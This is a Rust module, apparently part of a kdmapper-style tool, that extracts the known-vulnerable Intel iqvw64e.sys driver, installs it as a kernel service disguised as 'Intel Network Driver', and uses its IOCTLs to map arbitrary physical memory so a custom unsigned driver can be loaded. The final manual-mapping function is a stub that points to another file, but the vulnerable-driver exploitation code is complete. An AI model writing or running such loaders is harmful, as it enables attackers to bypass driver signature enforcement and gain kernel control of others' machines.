//! Embedded Driver Loader with Manual Mapping
//! 
//! This module is kept for reference but main functionality
//! is in embedded_driver.rs and kdmapper.rs

#![allow(dead_code)]

use std::ffi::c_void;
use std::fs;
use std::io::Write;
use std::mem;
use std::path::PathBuf;
use windows::core::PCWSTR;
use windows::Win32::Foundation::{HANDLE, CloseHandle, INVALID_HANDLE_VALUE, GetLastError};
use windows::Win32::System::Services::{
    OpenSCManagerW, CreateServiceW, OpenServiceW, StartServiceW, DeleteService,
    ControlService, CloseServiceHandle, SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS,
    SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
    SERVICE_CONTROL_STOP, SERVICE_STATUS, SC_HANDLE,
};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
};
use windows::Win32::System::IO::DeviceIoControl;

// ============================================================================
// Embedded Driver Bytes (only with embed_drivers feature)
// ============================================================================

#[cfg(feature = "embed_drivers")]
const INTEL_DRIVER_BYTES: &[u8] = include_bytes!("../../assets/iqvw64e.sys");

#[cfg(feature = "embed_drivers")]
const LAITH_DRIVER_BYTES: &[u8] = include_bytes!("../../assets/laithdriver.sys");

#[cfg(not(feature = "embed_drivers"))]
const INTEL_DRIVER_BYTES: &[u8] = &[];

#[cfg(not(feature = "embed_drivers"))]
const LAITH_DRIVER_BYTES: &[u8] = &[];

// ============================================================================
// Intel Driver IOCTL Codes
// ============================================================================

const IOCTL_INTEL_MAP_PHYSICAL: u32 = 0x80862007;
const IOCTL_INTEL_UNMAP_PHYSICAL: u32 = 0x80862008;

#[repr(C)]
struct IntelPhysicalMemory {
    interface_type: u64,
    bus_number: u64,
    address_space: u64,
    physical_address: u64,
    size: u64,
    out_ptr: u64,
}

// ============================================================================
// PE Structures for Manual Mapping
// ============================================================================

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageDosHeader {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageOptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_operating_system_version: u16,
    minor_operating_system_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    checksum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

// ============================================================================
// Driver Loader Implementation
// ============================================================================

pub struct DriverLoader {
    intel_handle: Option<HANDLE>,
    intel_service: Option<SC_HANDLE>,
    scm: Option<SC_HANDLE>,
    temp_path: PathBuf,
}

impl DriverLoader {
    pub fn new() -> Self {
        let temp_path = std::env::temp_dir();
        Self {
            intel_handle: None,
            intel_service: None,
            scm: None,
            temp_path,
        }
    }
    
    /// Load our driver using Intel vulnerability
    pub fn load_driver(&mut self, driver_bytes: &[u8]) -> Result<bool, String> {
        log::info!("[Loader] Starting driver loading process...");
        self.load_intel_driver()?;
        let success = self.map_driver(driver_bytes)?;
        self.unload_intel_driver();
        Ok(success)
    }
    
    fn load_intel_driver(&mut self) -> Result<(), String> {
        log::info!("[Loader] Loading Intel driver...");
        
        let intel_bytes = self.find_intel_driver()?;
        let intel_path = self.temp_path.join("iqvw64e.sys");
        
        let mut file = fs::File::create(&intel_path)
            .map_err(|e| format!("Failed to create temp file: {}", e))?;
        file.write_all(&intel_bytes)
            .map_err(|e| format!("Failed to write driver: {}", e))?;
        drop(file);
        
        log::info!("[Loader] Intel driver extracted to: {:?}", intel_path);
        
        unsafe {
            let scm = OpenSCManagerW(None, None, SC_MANAGER_ALL_ACCESS)
                .map_err(|e| format!("Failed to open SCM: {:?}", e))?;
            self.scm = Some(scm);
            
            let service_name: Vec<u16> = "iqvw64e\0".encode_utf16().collect();
            let display_name: Vec<u16> = "Intel Network Driver\0".encode_utf16().collect();
            let binary_path: Vec<u16> = format!("{}\0", intel_path.display())
                .encode_utf16().collect();
            
            let service = OpenServiceW(scm, PCWSTR::from_raw(service_name.as_ptr()), SERVICE_ALL_ACCESS);
            
            let service = if let Ok(svc) = service {
                log::info!("[Loader] Using existing Intel service");
                svc
            } else {
                log::info!("[Loader] Creating Intel service...");
                CreateServiceW(
                    scm,
                    PCWSTR::from_raw(service_name.as_ptr()),
                    PCWSTR::from_raw(display_name.as_ptr()),
                    SERVICE_ALL_ACCESS,
                    SERVICE_KERNEL_DRIVER,
                    SERVICE_DEMAND_START,
                    SERVICE_ERROR_IGNORE,
                    PCWSTR::from_raw(binary_path.as_ptr()),
                    None, None, None, None, None,
                ).map_err(|e| format!("Failed to create service: {:?}", e))?
            };
            
            self.intel_service = Some(service);
            let _ = StartServiceW(service, None);
            
            std::thread::sleep(std::time::Duration::from_millis(500));
            
            let device_path: Vec<u16> = "\\\\.\\Nal\0".encode_utf16().collect();
            let handle = CreateFileW(
                PCWSTR::from_raw(device_path.as_ptr()),
                0xC0000000,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            ).map_err(|e| format!("Failed to open Intel device: {:?}", e))?;
            
            if handle == INVALID_HANDLE_VALUE {
                return Err("Invalid handle to Intel driver".to_string());
            }
            
            self.intel_handle = Some(handle);
            log::info!("[Loader] Intel driver loaded successfully!");
        }
        
        Ok(())
    }
    
    fn find_intel_driver(&self) -> Result<Vec<u8>, String> {
        let exe_dir = std::env::current_exe()
            .map_err(|e| format!("Failed to get exe path: {}", e))?
            .parent()
            .map(|p| p.to_path_buf())
            .unwrap_or_default();
        
        let local_path = exe_dir.join("iqvw64e.sys");
        if local_path.exists() {
            log::info!("[Loader] Found Intel driver at: {:?}", local_path);
            return fs::read(&local_path).map_err(|e| format!("Failed to read driver: {}", e));
        }
        
        let current_dir = std::env::current_dir().unwrap_or_default();
        let current_path = current_dir.join("iqvw64e.sys");
        if current_path.exists() {
            log::info!("[Loader] Found Intel driver in current dir");
            return fs::read(&current_path).map_err(|e| format!("Failed to read driver: {}", e));
        }
        
        let driver_path = exe_dir.join("driver").join("iqvw64e.sys");
        if driver_path.exists() {
            log::info!("[Loader] Found Intel driver in driver folder");
            return fs::read(&driver_path).map_err(|e| format!("Failed to read driver: {}", e));
        }
        
        #[cfg(feature = "embed_drivers")]
        if !INTEL_DRIVER_BYTES.is_empty() {
            log::info!("[Loader] Using embedded Intel driver");
            return Ok(INTEL_DRIVER_BYTES.to_vec());
        }
        
        Err("Intel driver (iqvw64e.sys) not found!".to_string())
    }
    
    unsafe fn map_physical(&self, phys_addr: u64, size: u64) -> Result<*mut c_void, String> {
        let handle = self.intel_handle.ok_or("Intel driver not loaded")?;
        
        let mut request = IntelPhysicalMemory {
            interface_type: 1,
            bus_number: 0,
            address_space: 0,
            physical_address: phys_addr,
            size,
            out_ptr: 0,
        };
        
        let mut bytes_returned = 0u32;
        let result = DeviceIoControl(
            handle,
            IOCTL_INTEL_MAP_PHYSICAL,
            Some(&request as *const _ as *const c_void),
            mem::size_of::<IntelPhysicalMemory>() as u32,
            Some(&mut request as *mut _ as *mut c_void),
            mem::size_of::<IntelPhysicalMemory>() as u32,
            Some(&mut bytes_returned),
            None,
        );
        
        if result.is_ok() && request.out_ptr != 0 {
            Ok(request.out_ptr as *mut c_void)
        } else {
            Err(format!("Failed to map physical memory: {:?}", GetLastError()))
        }
    }
    
    unsafe fn unmap_physical(&self, mapped_addr: *mut c_void, size: u64) -> bool {
        let Some(handle) = self.intel_handle else { return false };
        
        let mut request = IntelPhysicalMemory {
            interface_type: 1,
            bus_number: 0,
            address_space: 0,
            physical_address: mapped_addr as u64,
            size,
            out_ptr: 0,
        };
        
        let mut bytes_returned = 0u32;
        DeviceIoControl(
            handle,
            IOCTL_INTEL_UNMAP_PHYSICAL,
            Some(&request as *const _ as *const c_void),
            mem::size_of::<IntelPhysicalMemory>() as u32,
            Some(&mut request as *mut _ as *mut c_void),
            mem::size_of::<IntelPhysicalMemory>() as u32,
            Some(&mut bytes_returned),
            None,
        ).is_ok()
    }
    
    fn map_driver(&self, _driver_bytes: &[u8]) -> Result<bool, String> {
        log::warn!("[Loader] Manual mapping requires advanced kernel manipulation");
        log::warn!("[Loader] Use kdmapper.rs instead");
        Ok(false)
    }
    
    fn unload_intel_driver(&mut self) {
        log::info!("[Loader] Cleaning up Intel driver...");
        
        unsafe {
            if let Some(handle) = self.intel_handle.take() {
                let _ = CloseHandle(handle);
            }
            
            if let Some(service) = self.intel_service.take() {
                let mut status = SERVICE_STATUS::default();
                let _ = ControlService(service, SERVICE_CONTROL_STOP, &mut status);
                let _ = DeleteService(service);
                let _ = CloseServiceHandle(service);
            }
            
            if let Some(scm) = self.scm.take() {
                let _ = CloseServiceHandle(scm);
            }
            
            let intel_path = self.temp_path.join("iqvw64e.sys");
            let _ = fs::remove_file(intel_path);
        }
        
        log::info!("[Loader] Intel driver unloaded");
    }
}

impl Drop for DriverLoader {
    fn drop(&mut self) {
        self.unload_intel_driver();
    }
}

// ============================================================================
// Simple Service-based Loader
// ============================================================================

pub struct ServiceLoader;

impl ServiceLoader {
    pub fn load(driver_path: &str, service_name: &str) -> Result<(), String> {
        unsafe {
            let scm = OpenSCManagerW(None, None, SC_MANAGER_ALL_ACCESS)
                .map_err(|e| format!("OpenSCManager failed: {:?}", e))?;
            
            let service_name_w: Vec<u16> = format!("{}\0", service_name).encode_utf16().collect();
            let binary_path_w: Vec<u16> = format!("{}\0", driver_path).encode_utf16().collect();
            
            let service = match OpenServiceW(scm, PCWSTR::from_raw(service_name_w.as_ptr()), SERVICE_ALL_ACCESS) {
                Ok(svc) => svc,
                Err(_) => {
                    CreateServiceW(
                        scm,
                        PCWSTR::from_raw(service_name_w.as_ptr()),
                        PCWSTR::from_raw(service_name_w.as_ptr()),
                        SERVICE_ALL_ACCESS,
                        SERVICE_KERNEL_DRIVER,
                        SERVICE_DEMAND_START,
                        SERVICE_ERROR_IGNORE,
                        PCWSTR::from_raw(binary_path_w.as_ptr()),
                        None, None, None, None, None,
                    ).map_err(|e| format!("CreateService failed: {:?}", e))?
                }
            };
            
            StartServiceW(service, None)
                .map_err(|e| format!("StartService failed: {:?}", e))?;
            
            let _ = CloseServiceHandle(service);
            let _ = CloseServiceHandle(scm);
            
            Ok(())
        }
    }
    
    pub fn unload(service_name: &str) -> Result<(), String> {
        unsafe {
            let scm = OpenSCManagerW(None, None, SC_MANAGER_ALL_ACCESS)
                .map_err(|e| format!("OpenSCManager failed: {:?}", e))?;
            
            let service_name_w: Vec<u16> = format!("{}\0", service_name).encode_utf16().collect();
            
            let service = OpenServiceW(scm, PCWSTR::from_raw(service_name_w.as_ptr()), SERVICE_ALL_ACCESS)
                .map_err(|e| format!("OpenService failed: {:?}", e))?;
            
            let mut status = SERVICE_STATUS::default();
            let _ = ControlService(service, SERVICE_CONTROL_STOP, &mut status);
            let _ = DeleteService(service);
            
            let _ = CloseServiceHandle(service);
            let _ = CloseServiceHandle(scm);
            
            Ok(())
        }
    }
}
